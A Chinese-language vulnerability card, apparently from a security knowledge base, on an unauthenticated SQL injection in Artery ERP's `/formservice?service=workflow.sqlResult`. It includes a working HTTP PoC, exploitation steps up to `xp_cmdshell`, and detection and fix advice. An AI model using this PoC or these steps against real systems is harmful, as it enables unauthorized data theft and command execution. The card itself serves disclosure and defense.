---
id: web-generic-sqli-artery-erp-workflow-sqlresult-unauth
title: Artery ERP workflow.sqlResult 未授权 SQL 注入：params/sql 直接交给 executeQuery
type: scenario
domain: web
path: web/generic/sqli
technique: erp-workflow-sqlresult-unauth-sqli
tags:
- web
- sqli
- java
- erp
- unauth
- formservice
- json
- mssql
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V237
  verified_at: '2026-11-07T09:20:34+08:00'
  notes: 已对照原文核对（33 图）；select @@version 实测回显 SQL Server 2019；未复现。
url: /docs/web/generic/sqli/web-generic-sqli-artery-erp-workflow-sqlresult-unauth/
draft: false
kb_aliases:
- sqlResult 前台 SQL 注入
- workflow.sqlResult
- FormService SQL 注入
- DBUtil.getFieldValue
- ERP 未授权注入
---

## 一句话结论

ERP 的 `com.artery.workflow.ServiceImpl#sqlResult` 通过 FormService 暴露为 `service=workflow.sqlResult`，从 JSON 请求体中取 `sql` 字符串并直接传给 `DBUtil.getFieldValue` → `Database.executeQuery(sql, variables)`；没有鉴权、没有参数化，未登录攻击者可执行任意 SQL，原文用 `select @@version` 回显 SQL Server 2019 版本。

## 原理

- 入口：`POST /formservice?service=workflow.sqlResult`，第三个参数类型为 `JSONObject`（FormService `contentType=3`），请求体 JSON 被解析成 `obj`。
- `sqlResult` 代码：
  ```java
  String sql = obj.getString("sql");
  JSONObject params = obj.getJSONObject("params");
  Map<String,Object> map = FormUtil.jsonObjectToMap(params);
  return DBUtil.getFieldValue(sql, map);
  ```
- `DBUtil.getFieldValue(String sql, Map variables)` → `getFieldValue(dbc, sql, variables)` → `dbc.executeQuery(sql, variables)`；`sql` 原样进入数据库执行，`variables` 只是可选参数绑定，攻击者可直接在 `sql` 中写任意语句/函数。
- `com.artery.workflow.ServiceImpl` 未实现有效的 `isAccessible` 匿名校验（原文称其为“前台 sql 注入”），FormService 反射调用不要求登录；`/formservice` 也不在 PortalFilter 的受保护后缀集合内。
- 因数据库为 Oracle 或 SQL Server，`select @@version` 等语句可直接回显；也可执行联合查询、堆叠/存储过程（视数据库与权限）读取业务数据。

## 触发条件

- 目标部署该 ERP/框架，`/formservice` 可访问，`workflow` 服务存在且 `ServiceImpl` 未做匿名拦截。
- `sqlResult` 为 public 且第三参数为 `JSONObject`；请求 JSON 需包含 `params`（对象，内部至少一个键值对）与 `sql`。
- 数据库账户有对应查询权限；错误信息/响应 XML 会回显查询结果。
- 无需登录（或仅有任意低权限账号）。

## 利用步骤

1. 发送基线请求 `{"params":{"hello":"world"},"sql":"select @@version"}`，观察 XML 响应是否返回数据库版本。
2. 根据数据库类型构造查询：SQL Server 用 `select @@version`、`select db_name()`、`select name from sys.databases`；Oracle 用 `select banner from v$version`、`select * from all_tables`。
3. 用 UNION/子查询读取业务表（用户、订单、配置）；按列数/类型调整。
4. 若支持堆叠语句/高权限，可进一步执行 `xp_cmdshell`（SQL Server）或存储过程；先确认权限与出网。
5. 记录请求、响应与数据库版本/表名作为证据，避免大规模拖库。

## PoC

```http
POST /formservice?service=workflow.sqlResult HTTP/1.1
Host: target
Content-Type: application/json
Content-Length: 57

{"params":{"hello":"world"},"sql":"select @@version"}
```

响应（原文）：

```xml
<?xml version="1.0" encoding="utf-8"?>
<root>
Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
Sep 24 2019 13:48:23
Copyright (C) 2019 Microsoft Corporation
Developer Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)
</root>
```

## 变体与关联

- 变体：`params` 可用于占位符绑定，但不影响 `sql` 本身的拼接执行；可把恶意 SQL 放在 `sql` 中，`params` 保持任意合法对象。
- 变体：其他 `ServiceImpl`/`DBUtil` 调用点（`executeSql`、`selUser` 等）若同样接收外部 SQL/参数，也可能注入；审计所有 `getFieldValue`/`executeQuery` 调用。
- 关联：FormService 机制 [[web-java-framework-formservice-reflection-dispatch-unauth]]；通用 SQL 注入手法 [[web-generic-sqli-hibernate-hql-native-query-injection]] 等；同系统其他 sink 见本篇上传/文件读写/XXE 卡。
- 边界：`sqlResult` 被 `isAccessible` 拦截、数据库禁用多语句/函数、错误不回显且无法盲注时，利用受限。

## 检测与防御

- 检测：`/formservice?service=workflow.sqlResult` 请求；JSON 中 `sql` 含 `select`、`@@version`、`union`、`xp_cmdshell` 等；响应 XML 返回数据库版本/表数据；同一 IP 高频调用。
- 修复：`sqlResult` 不应接受客户端 SQL；若必须动态查询，使用预定义 SQL 模板 + 参数绑定（`PreparedStatement`），字段名/表名白名单。
- 加固：`ServiceImpl` 实现 `ISecurityService` 并校验登录/角色；`DBUtil.getFieldValue` 增加 SQL 白名单与只读限制；数据库账户最小权限；关闭错误回显。
